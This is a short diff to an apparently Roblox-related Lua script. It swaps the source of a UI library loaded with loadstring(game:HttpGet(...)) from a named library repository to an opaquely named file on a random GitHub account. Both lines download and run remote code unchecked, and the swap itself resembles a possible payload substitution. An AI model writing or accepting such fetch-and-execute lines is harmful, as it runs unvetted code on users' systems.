@@ -1142,7 +1142,7 @@ end
 -- ====================================================================
 -- INICIALIZAÇÃO DA BIBLIOTECA REDZLIB
 -- ====================================================================
-local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RedzLibV5/main/Source.Lua"))()
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/gsoqh9qy29wyiwy-a11y/Dark-x-HUB-/refs/heads/main/XqZsnzRQ.txt"))()
 
 -- ====================================================================
 -- CRIAÇÃO DA JANELA PRINCIPAL
